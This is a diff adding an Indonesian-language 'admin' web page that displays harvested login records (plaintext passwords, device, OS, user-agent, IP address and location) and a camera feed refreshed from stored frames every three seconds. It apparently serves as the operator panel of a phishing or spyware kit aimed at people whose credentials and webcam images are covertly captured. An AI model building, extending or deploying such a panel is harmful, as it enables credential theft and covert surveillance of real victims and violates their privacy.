@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Admin</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #f4f4f4;
+        }
+        table {
+            width: 95%;
+            margin: 20px auto;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid black;
+            padding: 10px;
+        }
+        th {
+            background: #ddd;
+        }
+        #cameraStream {
+            width: 320px;
+            height: 240px;
+            border: 1px solid black;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h2>Data Login</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Waktu</th>
+                <th>Password</th>
+                <th>Perangkat</th>
+                <th>Sistem Operasi</th>
+                <th>User-Agent</th>
+                <th>IP Address</th>
+                <th>Lokasi</th>
+            </tr>
+        </thead>
+        <tbody id="loginTable"></tbody>
+    </table>
+
+    <h2>Streaming Kamera</h2>
+    <img id="cameraStream" src="" alt="Live Camera">
+
+    <script>
+        // Tampilkan data login
+        function loadLoginData() {
+            const loginData = JSON.parse(localStorage.getItem("loginData")) || [];
+            const tableBody = document.getElementById("loginTable");
+            tableBody.innerHTML = "";
+
+            loginData.forEach((data) => {
+                const row = document.createElement("tr");
+                row.innerHTML = `
+                    <td>${data.time}</td>
+                    <td>${data.password}</td>
+                    <td>${data.device}</td>
+                    <td>${data.os}</td>
+                    <td>${data.userAgent}</td>
+                    <td>${data.ip}</td>
+                    <td>${data.location}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+
+        // Streaming kamera dari localStorage
+        function updateCameraStream() {
+            const img = document.getElementById("cameraStream");
+            const frame = localStorage.getItem("cameraFrame");
+            if (frame) img.src = frame;
+        }
+
+        // Muat data login dan update kamera setiap 3 detik
+        loadLoginData();
+        setInterval(updateCameraStream, 3000);
+    </script>
+</body>
+</html>
